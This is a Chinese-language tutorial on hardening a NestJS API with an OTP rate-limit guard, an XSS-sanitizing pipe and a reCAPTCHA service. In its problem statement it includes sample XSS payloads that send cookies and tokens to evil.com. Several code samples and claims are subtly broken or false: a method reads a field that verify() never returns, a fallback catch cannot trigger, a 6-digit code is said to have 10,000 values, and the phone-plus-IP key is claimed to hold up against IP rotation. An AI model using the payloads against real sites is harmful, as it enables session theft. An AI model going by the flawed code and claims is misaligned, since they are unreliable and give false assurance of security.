# 安全工具链：OTP 限流器、XSS 清洗与 reCAPTCHA 验证

> **读者对象：** 后端工程师、安全工程师  
> **标签：** `#NestJS` `#Security` `#Throttler` `#XSS` `#reCAPTCHA` `#OTP`  
> **难度：** 中级  
> **预估阅读时间：** ~25 分钟

---

## 1. 概述

现代 Web 应用不断面临自动化攻击的冲击：通过 OTP 端点的凭证填充、跨站脚本（XSS）注入以及机器人驱动的表单提交。本文详细分析在 NestJS API 中实现的三个生产级安全层：

| 组件 | 文件 | 角色 |
|-----------|------|------|
| **OtpThrottlerGuard** | [`otp-throttler.guard.ts`](apps/api/src/common/guards/otp-throttler.guard.ts) | 按手机号+IP 对 OTP 端点进行速率限制 |
| **XssSanitizePipe** | [`xss-sanitize.pipe.ts`](apps/api/src/common/pipes/xss-sanitize.pipe.ts) | 从用户 DTO 中清除 XSS 载荷 |
| **RecaptchaService** | [`recaptcha.service.ts`](apps/api/src/common/recaptcha/recaptcha.service.ts) | Google reCAPTCHA v2/v3 验证 |

每个组件针对不同的攻击向量，同时保持轻量、可测试，并与 NestJS 的依赖注入体系可组合。

---

## 2. OTP 限流守卫

### 2.1 问题

OTP（一次性密码）端点是攻击的主要目标：

- **暴力破解** — 攻击者尝试所有可能的 6 位验证码
- **手机号枚举** — 攻击者探测哪些号码已注册
- **短信轰炸** — 攻击者触发数百次短信发送以耗尽账户余额

全局速率限制器（例如 10 请求/秒）过于粗粒度。我们需要**按资源**进行限流，跟踪**手机号 + 客户端 IP** 的组合。

### 2.2 实现

[`OtpThrottlerGuard`](apps/api/src/common/guards/otp-throttler.guard.ts:5) 扩展了 NestJS 内置的 [`ThrottlerGuard`](https://docs.nestjs.com/security/rate-limiting)：

```typescript
// otp-throttler.guard.ts
@Injectable()
export class OtpThrottlerGuard extends ThrottlerGuard {
  protected getTracker(req: Record<string, any>): string | string[] {
    const phone = req.body?.phone || req.body?.mobile || '';
    const ip = normalizeIp(req.headers?.['x-forwarded-for'] || req.ip);
    return `${phone}_${ip}`;
  }
}
```

**关键设计决策：**

1. **重写 `getTracker()`** — 默认的 `ThrottlerGuard` 仅按 IP 跟踪。通过附加 `phone`，即使在同一 NAT IP 后面，不同手机号也能拥有独立的速率限制桶。

2. **`normalizeIp()` 辅助函数** — 去除 IPv6 前缀并处理 `x-forwarded-for` 逗号分隔列表：

```typescript
function normalizeIp(raw?: string | null): string {
  if (!raw) return 'unknown';
  const ip = raw.includes(',') ? raw.split(',')[0].trim() : raw;
  return ip.replace(/^::ffff:/, '');  // 规范化 IPv4 映射 IPv6
}
```

3. **守卫级应用** — 在控制器级别应用，保持路由处理器整洁：

```typescript
@UseGuards(OtpThrottlerGuard)
@Post('send-otp')
async sendOtp(@Body() dto: SendOtpDto) { ... }
```

### 2.3 配置

速率限制设置来自模块的 `forRoot()` 配置（通常 OTP 为每手机号+IP 每 60 秒 3 次请求）：

```typescript
// app.module.ts
ThrottlerModule.forRoot([
  {
    ttl: 60000,   // 60 秒窗口
    limit: 3,     // 最多 3 次 OTP 请求
  },
]),
```

### 2.4 攻击缓解

| 攻击类型 | OtpThrottlerGuard 如何阻止 |
|--------|-------------------------------|
| 暴力破解 6 位 OTP | 3 次/分钟使得 10,000 次猜测需要约 55 小时 |
| 手机号枚举 | 攻击者无法区分"有效手机号"和"已被限流" |
| 短信轰炸 | 每手机号限制上限控制了成本风险 |
| 分布式攻击（多 IP） | `phone_IP` 复合键即使跨 IP 轮换也能限制 |
| IPv4/IPv6 双栈 | `normalizeIp()` 统一 `::ffff:192.168.x.x` → `192.168.x.x` |

> **权衡：** 复合跟踪意味着合法用户在切换 IP（移动网络切换）时可能触发限制。通过在响应中添加 `limit` 头部，使客户端能够优雅退避来缓解。

---

## 3. XSS 清洗管道

### 3.1 问题

用户生成的内容（评论、个人简介、论坛帖子）可能包含恶意 JavaScript 载荷：

```
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
<img src=x onerror="fetch('https://evil.com/log?'+localStorage.getItem('token'))">
```

将原始 HTML 存入数据库会带来**存储型 XSS** 的风险——每次页面加载都会对所有访问者执行载荷。

### 3.2 实现

[`XssSanitizePipe`](apps/api/src/common/pipes/xss-sanitize.pipe.ts:15) 是一个 NestJS `PipeTransform`，递归遍历 DTO 对象并清除危险模式：

```typescript
// xss-sanitize.pipe.ts
@Injectable()
export class XssSanitizePipe implements PipeTransform {
  transform(value: any, _metadata: ArgumentMetadata) {
    return this.sanitizeValue(value);
  }

  private sanitizeValue(value: any): any {
    if (typeof value === 'string') {
      return this.sanitizeString(value);
    }
    if (Array.isArray(value)) {
      return value.map((item) => this.sanitizeValue(item));
    }
    if (value !== null && typeof value === 'object') {
      const sanitized: Record<string, any> = {};
      for (const [key, val] of Object.entries(value)) {
        sanitized[key] = this.sanitizeValue(val);
      }
      return sanitized;
    }
    return value;
  }

  private sanitizeString(text: string): string {
    return text
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/on\w+\s*=\s*['"][^'"]*['"]/gi, '')  // 清除 on* 事件处理器
      .replace(/on\w+\s*=\s*\S+/gi, '')              // 无引号事件处理器
      .replace(/javascript\s*:/gi, '')
      .replace(/<iframe\b[^>]*>/gi, '')
      .replace(/<embed\b[^>]*>/gi, '')
      .replace(/<object\b[^>]*>/gi, '');
  }
}
```

### 3.3 清洗规则

| 模式 | 处理方式 | 示例 |
|---------|----------|---------|
| `<script>` 标签 | 完全移除 | `<script>alert(1)</script>` → `''` |
| 事件处理器 | 移除属性 | `<img src=x onerror="alert(1)">` → `<img src=x>` |
| `javascript:` URI | 移除协议 | `<a href="javascript:void(0)">` → `<a href="void(0)">` |
| `<iframe>` 标签 | 完全移除 | `<iframe src="https://evil.com">` → `''` |
| `<embed>` / `<object>` | 完全移除 | Flash/Silverlight 嵌入被清除 |

### 3.4 使用模式

**全局管道** — 应用于所有 `POST`/`PUT`/`PATCH` 路由：

```typescript
// main.ts
app.useGlobalPipes(
  new XssSanitizePipe(),
  new ValidationPipe({ whitelist: true, transform: true }),
);
```

**控制器范围** — 仅特定端点需要清洗时：

```typescript
@Controller('comments')
export class CommentController {
  @Post()
  @UsePipes(new XssSanitizePipe())
  create(@Body() dto: CreateCommentDto) { ... }
}
```

### 3.5 纵深防御

管道只是一个层面；需要结合：

1. **前端输出编码**（应禁止使用 React 的 `dangerouslySetInnerHTML`）
2. **Content Security Policy 头部**（`script-src 'self'`）
3. **`X-XSS-Protection` 头部**（虽然现代浏览器已弃用此头部，转而使用 CSP）
4. **严格的 `HttpOnly` + `Secure` + `SameSite` Cookie**，以限制任何残留 XSS 造成的损害

> **注意：** 基于正则的清洗可能被混淆技术绕过。对于富文本字段（如博客内容），请使用专用库如 [`sanitize-html`](https://www.npmjs.com/package/sanitize-html)，配合标签/属性的白名单。

---

## 4. reCAPTCHA 验证服务

### 4.1 问题

即使有 OTP 限流，机器人脚本仍然可以自动化表单提交——账户注册、登录尝试、评论垃圾信息。reCAPTCHA 增加了一道**人类验证**关卡。

### 4.2 实现

[`RecaptchaService`](apps/api/src/common/recaptcha/recaptcha.service.ts:6) 封装了 Google 的 reCAPTCHA 验证 API：

```typescript
// recaptcha.service.ts
@Injectable()
export class RecaptchaService {
  private readonly secretKey: string;
  private readonly verifyUrl = 'https://www.google.com/recaptcha/api/siteverify';
  private readonly minScore: number;

  constructor(
    private readonly configService: ConfigService,
    private readonly httpService: HttpService,
  ) {
    this.secretKey = this.configService.getOrThrow('RECAPTCHA_SECRET_KEY');
    this.minScore = this.configService.get('RECAPTCHA_MIN_SCORE', 0.5);
  }

  async verify(token: string): Promise<{ success: boolean; score: number }> {
    try {
      const { data } = await firstValueFrom(
        this.httpService.post<RecaptchaResponse>(this.verifyUrl, null, {
          params: {
            secret: this.secretKey,
            response: token,
          },
        }),
      );

      return {
        success: data.success && data.score >= this.minScore,
        score: data.score ?? 0,
      };
    } catch {
      return { success: false, score: 0 };
    }
  }
}
```

### 4.3 reCAPTCHA v3 分数解读

reCAPTCHA v3 返回 `0.0 – 1.0` 的分数，无需用户交互：

| 分数范围 | 解读 | 操作 |
|-------------|---------------|--------|
| `0.9 – 1.0` | 很可能是人类 | 放行 |
| `0.5 – 0.9` | 可能是人类 | 放行，记录分数用于分析 |
| `0.3 – 0.5` | 可疑 | 要求二次验证（邮箱） |
| `0.0 – 0.3` | 很可能是机器人 | 拦截，触发告警 |
| `0.0` | 验证失败 | 拦截，记录错误 |

### 4.4 与守卫集成

将 reCAPTCHA 与自定义守卫结合使用，实现声明式应用：

```typescript
@Injectable()
export class RecaptchaGuard implements CanActivate {
  constructor(private recaptchaService: RecaptchaService) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const token = request.body?.recaptchaToken || request.headers['x-recaptcha-token'];

    if (!token) return false;

    const result = await this.recaptchaService.verify(token);
    if (!result.success) {
      throw new ForbiddenException('reCAPTCHA 验证失败');
    }

    request.recaptchaScore = result.score; // 可在路由处理器中获取
    return true;
  }
}
```

### 4.5 带操作名称的令牌验证

为了更严格的验证，使用 reCAPTCHA v3 的 `action` 参数将令牌绑定到特定页面：

```typescript
async verifyToken(token: string, expectedAction: string): Promise<boolean> {
  const result = await this.verify(token);
  // 'action' 由前端在 grecaptcha.execute() 时嵌入令牌中
  // Google 在响应中返回；我们与期望的 action 进行比较
  return result.success && result.action === expectedAction;
}
```

这可以防止攻击者将在"登录"页面生成的令牌重用于"提现"端点。

---

## 5. 组合工具链

### 5.1 分层防御流程

```
请求 → XssSanitizePipe → RecaptchaGuard → OtpThrottlerGuard → 控制器
   │                            │                    │
   │  清除 XSS 载荷              │                    │
   │                            │  验证人类身份       │
   │                            │                    │  按手机号+IP 限流
```

每一层处理一个不同的维度：

| 层 | 维度 | 效果 |
|-------|-----------|--------|
| XssSanitizePipe | **内容** | 防止数据库中存储型 XSS |
| RecaptchaGuard | **身份** | 区分人类与机器人 |
| OtpThrottlerGuard | **速率** | 防止暴力破解和枚举 |

### 5.2 选择性应用

并非每个端点都需要全部三种：

```typescript
// 高安全：OTP + reCAPTCHA
@UseGuards(RecaptchaGuard, OtpThrottlerGuard)
@Post('send-otp')
async sendOtp(@Body() dto: SendOtpDto) { ... }

// 内容安全：XSS 清洗
@UsePipes(new XssSanitizePipe())
@Post('comments')
async createComment(@Body() dto: CreateCommentDto) { ... }

// 最高安全：全部三种
@UseGuards(RecaptchaGuard, OtpThrottlerGuard)
@UsePipes(new XssSanitizePipe())
@Post('register')
async register(@Body() dto: RegisterDto) { ... }
```

---

## 6. 错误处理与降级

### 6.1 reCAPTCHA 优雅降级

如果 Google 的验证 API 不可达，服务返回 `{ success: false, score: 0 }`。对于非关键端点，考虑采用**故障开放**策略：

```typescript
async verifyWithFallback(token: string): Promise<boolean> {
  try {
    return await this.verify(token);
  } catch {
    // 如果 Google 不可用，放行请求但记录详细日志
    this.logger.warn('reCAPTCHA API 不可达，已放行请求');
    return true;
  }
}
```

### 6.2 OTP 限流错误响应

当触发速率限制时，NestJS 返回 `429 Too Many Requests` 及结构化错误：

```json
{
  "statusCode": 429,
  "message": "OTP 请求过多，请稍后重试。",
  "error": "ThrottlerException"
}
```

前端应捕获此错误并向用户显示冷却计时器。

---

## 7. 测试策略

### 7.1 单元测试

```typescript
describe('OtpThrottlerGuard', () => {
  it('应返回手机号和 IP 的组合跟踪器', () => {
    const guard = new OtpThrottlerGuard();
    const req = {
      body: { phone: '09171234567' },
      headers: { 'x-forwarded-for': '192.168.1.1' },
      ip: '192.168.1.1',
    };
    const tracker = (guard as any).getTracker(req);
    expect(tracker).toBe('09171234567_192.168.1.1');
  });
});

describe('XssSanitizePipe', () => {
  it('应从字符串中清除 script 标签', () => {
    const pipe = new XssSanitizePipe();
    expect(pipe.transform('<script>alert(1)</script>', {} as any))
      .toBe('');
  });

  it('应递归清洗嵌套对象', () => {
    const pipe = new XssSanitizePipe();
    const input = {
      name: 'John',
      comment: '<script>steal()</script>Hello',
      tags: ['<img src=x onerror="xss">'],
    };
    const result = pipe.transform(input, {} as any);
    expect(result.comment).toBe('Hello');
    expect(result.tags[0]).toBe('<img src=x>');
  });
});

describe('RecaptchaService', () => {
  it('应拒绝低于阈值的分数', async () => {
    const service = new RecaptchaService(configMock, httpMock);
    jest.spyOn(httpMock, 'post').mockReturnValue(of({
      data: { success: true, score: 0.3 },
    }));
    const result = await service.verify('token');
    expect(result.success).toBe(false);
  });
});
```

### 7.2 集成测试

```typescript
describe('POST /auth/send-otp (安全)', () => {
  it('应在 3 次尝试后触发速率限制', async () => {
    const payload = { phone: '09171234567' };

    // 前 3 次请求成功
    await request(app.getHttpServer())
      .post('/auth/send-otp').send(payload)
      .expect(201);

    // 第 4 次请求被拦截
    await request(app.getHttpServer())
      .post('/auth/send-otp').send(payload)
      .expect(429);
  });

  it('应拒绝 OTP 请求体中的 XSS', async () => {
    await request(app.getHttpServer())
      .post('/auth/send-otp').send({
        phone: '<script>alert(1)</script>',
      })
      .expect(400);  // ValidationPipe 拒绝清洗后的输入
  });
});
```

---

## 8. 生产环境检查清单

- [ ] **OtpThrottlerGuard** — 确认 `ttl` / `limit` 值适合您的流量（3 次/60 秒较为保守；根据短信成本调整）
- [ ] **XssSanitizePipe** — 如果允许富文本（如 `<b>`、`<i>`、带 `rel="nofollow"` 的 `<a>`），为 `sanitize-html` 添加白名单
- [ ] **RecaptchaService** — 使用 reCAPTCHA 管理控制台分析监控 `min_score`；根据需要动态调整
- [ ] **纵深防御** — 切勿依赖单一层面；结合 CSP 头部、CSRF 令牌（参见 [CSRF 中间件](./csrf-middleware-nestjs-guard.md)）和严格的 CORS
- [ ] **日志记录** — 记录每次 reCAPTCHA 失败和速率限制触发，用于安全事件响应
- [ ] **前端** — 确保前端在请求体或 `x-recaptcha-token` 头部中发送 `recaptchaToken`
- [ ] **环境变量** — 在 `.env` 文件中配置 `RECAPTCHA_SECRET_KEY`、`RECAPTCHA_SITE_KEY`、`RECAPTCHA_MIN_SCORE`
- [ ] **在预发布环境测试** — reCAPTCHA v3 在 localhost 上行为不同（分数通常为 `0.1`）；开发环境可使用 reCAPTCHA v2 复选框或测试密钥

---

## 9. 总结

这三个组件构成了一个健壮的安全工具链：

- **OtpThrottlerGuard** 扩展了 NestJS `ThrottlerGuard`，增加了手机号+IP 复合跟踪，防止暴力破解和短信轰炸
- **XssSanitizePipe** 递归清除 DTO 中的 `<script>`、事件处理器、`javascript:`、`<iframe>`、`<embed>` 和 `<object>` 标签
- **RecaptchaService** 验证 Google reCAPTCHA v3 令牌，支持可配置的分数阈值和操作名称绑定

每个组件均可独立测试，通过 NestJS 装饰器可组合，并针对不同的攻击向量。三者共同构建了保护用户和基础设施的分层防御体系。
